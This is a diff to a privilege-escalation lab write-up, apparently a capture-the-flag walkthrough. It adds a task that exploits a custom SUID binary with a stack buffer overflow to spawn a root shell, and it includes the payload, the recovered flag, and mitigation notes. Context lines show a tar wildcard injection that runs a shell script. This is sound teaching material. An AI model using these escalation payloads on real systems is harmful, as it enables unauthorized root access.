@@ -7,6 +7,7 @@ Default access: `ssh user@<target-ip>` (password: `user`)
 |------|-----------|-----------|
 | 1 | Sudo misconfiguration (`choom`) | `0-flag.txt` |
 | 2 | Cron + writable path + `tar` wildcards | `1-flag.txt` |
+| 3 | SUID binary buffer overflow (`/home/user/service`) | `2-flag.txt` |
 
 ---
 
@@ -213,6 +214,155 @@ Root cron every minute
 
 ---
 
+# Task 3 — SUID binary buffer overflow
+
+## Objective
+
+Identify misconfigured SUID binaries, exploit a vulnerability, gain root, and read `/root/flag.txt`.
+
+**Hint:** SUID binaries run with the file owner's privileges (often root). Misconfigurations, unchecked input, or buffer overflows can escalate privileges.
+
+## Enumeration
+
+### 1. Find SUID binaries
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+# also useful:
+find / -perm -2000 -type f 2>/dev/null   # SGID
+```
+
+Notable findings:
+
+```text
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/sudo
+...
+/home/user/service          # custom SUID binary — high interest
+```
+
+### 2. Inspect the custom binary
+
+```bash
+ls -la /home/user/service
+# -rwsr-xr-x 1 root root ... /home/user/service
+
+file /home/user/service
+strings /home/user/service
+ldd /home/user/service
+```
+
+Interesting strings:
+
+```text
+Usage: %s <input>
+strcpy
+system
+setuid
+setgid
+strcmp
+11111111
+22222222
+/bin/bash
+```
+
+### 3. Behavioral / static analysis
+
+```bash
+/home/user/service
+# Usage: /home/user/service <input>
+
+/home/user/service test
+# Buffer: test
+# e: 1
+# s: 1
+# t: 2
+
+objdump -d /home/user/service | sed -n '/<main>:/,/^$/p'
+objdump -s -j .rodata /home/user/service
+```
+
+Logic reconstructed from `main`:
+
+1. Stack password initialized to `"11111111"`.
+2. `argv[1]` is copied with **`strcpy`** into a small stack buffer at `rbp-0x70` (no bounds check).
+3. Character frequencies of the input are printed.
+4. Stack password is compared with **`"22222222"`** via `strcmp`.
+5. On match: `setuid(0)`, `setgid(0)`, `system("/bin/bash")`.
+
+Because the password is initialized to `11111111`, a normal input never matches `22222222` — unless **`strcpy` overflows** and overwrites the adjacent password buffer.
+
+### Stack layout (relevant)
+
+```text
+rbp-0x70  : input buffer  (strcpy destination)
+...
+rbp-0x21  : password[9]   (initially "11111111\0")
+```
+
+Distance: `0x70 - 0x21 = 0x4f = 79` bytes of padding before the password.
+
+## Exploitation
+
+Overwrite the stack password so it becomes `22222222`:
+
+```bash
+# Interactive root shell
+/home/user/service $(python3 -c 'print("A"*79 + "22222222")')
+
+# Or non-interactive:
+python3 -c 'import os; os.execv("/home/user/service", ["/home/user/service", "A"*79 + "22222222"])'
+# then in the root shell:
+id
+cat /root/flag.txt
+```
+
+Confirmed:
+
+```text
+uid=0(root) gid=0(root) groups=0(root),1000(user)
+your flag is 6a15b12e63b957ca8d4ffd8fb7e2d292
+```
+
+One-liner payload sketch:
+
+```bash
+python3 -c 'print("A"*79 + "22222222")' | xargs -I{} /home/user/service {}
+# better with exec for a real TTY shell:
+/home/user/service "$(python3 -c 'print("A"*79+"22222222")')"
+```
+
+## Flag (Task 3)
+
+```text
+6a15b12e63b957ca8d4ffd8fb7e2d292
+```
+
+(`/root/flag.txt` content was: `your flag is 6a15b12e63b957ca8d4ffd8fb7e2d292`)  
+Stored in `2-flag.txt`.
+
+## Why it works
+
+| Issue | Detail |
+|-------|--------|
+| SUID root | Binary runs with euid=0 |
+| Unbounded `strcpy` | Attacker-controlled length into fixed stack buffer |
+| Adjacent secret | Password lives next to the buffer on the stack |
+| Privileged spawn | Match → `setuid(0)` + `system("/bin/bash")` |
+
+Classic **stack-based buffer overflow** on a **SUID** helper to overwrite a local password check.
+
+## Mitigation (defender notes)
+
+1. Avoid custom SUID binaries; prefer capability-scoped helpers or sudo with narrow rules.
+2. Never use `strcpy` / `gets` / `sprintf` — use `strncpy`, `strlcpy`, or safer APIs with length checks.
+3. Enable compiler hardening: stack canaries (`-fstack-protector-strong`), PIE, FORTIFY_SOURCE, RELRO.
+4. Audit periodically: `find / -perm -4000 -type f 2>/dev/null`.
+5. If a privileged check is required, keep secrets out of overflowable stack buffers (and do not embed weak static passwords).
+
+---
+
 # Quick reference
 
 ### Task 1
@@ -230,4 +380,11 @@ echo > '--checkpoint=1'
 echo > '--checkpoint-action=exec=sh shell.sh'
 # wait ~1 min
 cat /tmp/pwned_flag.txt
+```
+
+### Task 3
+
+```bash
+/home/user/service "$(python3 -c 'print("A"*79 + "22222222")')"
+# root shell -> cat /root/flag.txt
 ```
